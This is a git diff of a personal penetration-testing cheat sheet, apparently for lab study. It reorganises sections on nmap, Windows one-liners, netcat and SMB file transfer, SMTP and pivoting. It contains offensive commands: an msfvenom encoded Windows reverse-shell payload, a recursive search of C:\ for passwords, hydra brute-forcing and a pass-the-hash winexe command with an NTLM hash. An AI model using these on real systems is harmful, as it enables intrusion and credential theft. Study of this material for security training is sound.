@@ -1,6 +1,7 @@
 # TODO: Table of Contents/Links
 
-# tools
+
+# network scanning
 ## nmap 
 ### Basic Scanning Techniques
 -   Scan a single target
@@ -217,10 +218,30 @@
     -   `nmap –script-updatedb`
 
 
-## 
 
 
-# COMMANDS
+
+
+# one-liners
+## windows
+#### dir and file
+list all files current dir
+`get-childitem -hidden` 
+
+search C:\ for password
+`ci -recurse C:\ | % { select-string -path $_ -pattern password} 2>$null`
+
+base64
+`certutil -encone/-decode <FILE> <OUTFILE>`
+
+copy contents of file to clipboard
+`Get-Content <FILENAME> | Set-Clipboard`
+
+
+## nix
+
+
+# shells & file transfers
 ### netcat
 #### file transfer
 target machine
@@ -274,36 +295,17 @@ create self-signed certificate
 `passive`
 toggles the passive/active mode during session
 
-
 ### MSFVenom
 
 #### shell generation - bytes
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "BYTES_GO_here"
 ```
-
-
-## windows
-### one-liners
-#### dir and file
-list all files current dir
-`get-childitem -hidden` 
-
-search C:\ for password
-`ci -recurse C:\ | % { select-string -path $_ -pattern password} 2>$null`
-
-base64
-`certutil -encone/-decode <FILE> <OUTFILE>`
-
-copy contents of file to clipboard
-`Get-Content <FILENAME> | Set-Clipboard`
-
-
-# network file transfers
-smb setup on nix
+### smb 
+#### setup on nix
 `$ sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1`
 
-create cred object
+#### create cred object
 ```
 > $pass = convertto-securestring 'password1' -AsPlainText -Force`
 > $cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
@@ -345,7 +347,8 @@ sharpweb?
 python cracker?
 
 
-# smtp emial
+
+# smtp email
 
 ### email w/ smtp > netcat
 
@@ -368,6 +371,7 @@ QUIT
 ```
 
 `cat "smtp" |while read L; do sleep "1"; echo "$L"; done | "nc" -C -v "192.168.243.55" "25"`
+
 
 # Pivoting
 
@@ -405,6 +409,7 @@ generate shellcode, filtering out bad characters
 
 #### anonymous/fake login - list shares
 cme smb 10.10.11.152 -u 'anon' -p '' --shares 
+
 
 
 
@@ -453,6 +458,7 @@ hydra HTTP POST attack specifying username "admin" with "INVALID LOGIN" being a 
 #### pass the hash - winexe
 use pth-winexe to pass the hash, executing a command prompt 
 `pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
+
 
 
 
